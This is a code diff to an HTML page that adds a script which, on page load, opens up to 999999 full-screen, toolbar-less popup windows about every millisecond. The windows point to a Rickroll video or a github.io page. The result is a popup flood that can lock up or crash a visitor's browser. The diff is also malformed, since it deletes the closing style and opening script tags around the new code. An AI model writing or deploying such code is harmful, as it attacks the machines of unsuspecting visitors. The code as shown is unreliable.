@@ -5,28 +5,22 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>let it die let it die let it shrivel up and die</title>
     <style>
-        body {
-            background-color: #6F4F28;
-        }
-        h1 {
-            color: #FF0000;
-        }
-    </style>
-    <script>
-        function openWindows(url, numberOfWindows, interval) {
+         function openWindows(numberOfWindows, interval) {
+            const links = [
+                'https://www.youtube.com/watch?v=dQw4w9WgXcQ', // YouTube link
+                'https://eagx.github.io/eagx' // Alternate link
+            ];
             let count = 0;
 
             function openWindow() {
                 if (count < numberOfWindows) {
+                    const randomLink = links[Math.floor(Math.random() * links.length)];
                     const screenWidth = window.screen.availWidth;
                     const screenHeight = window.screen.availHeight;
-                    const windowWidth = 800; 
-                    const windowHeight = 600; 
 
-                    const left = Math.floor(Math.random() * (screenWidth - windowWidth));
-                    const top = Math.floor(Math.random() * (screenHeight - windowHeight));
+                    // Open the window with the random link
+                    window.open(randomLink, '_blank', `width=${screenWidth},height=${screenHeight},left=0,top=0,scrollbars=no,toolbar=no,location=no,menubar=no,resizable=yes`);
 
-                    window.open(url, '_blank', `width=${windowWidth},height=${windowHeight},left=${left},top=${top}`);
                     count++;
                     setTimeout(openWindow, interval);
                 }
@@ -36,11 +30,9 @@
         }
 
         window.onload = function() {
-            const url = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; 
-            const windowsPerSecond = 200; 
-            const interval = 10 / windowsPerSecond; 
-
-            openWindows(url, 9999999, interval); 
+            const windowsPerSecond = 999999; // Adjust as needed
+            const interval = 999999 / windowsPerSecond; 
+            openWindows(999999, interval); // Adjust the total number of windows
         };
     </script>
 </head>
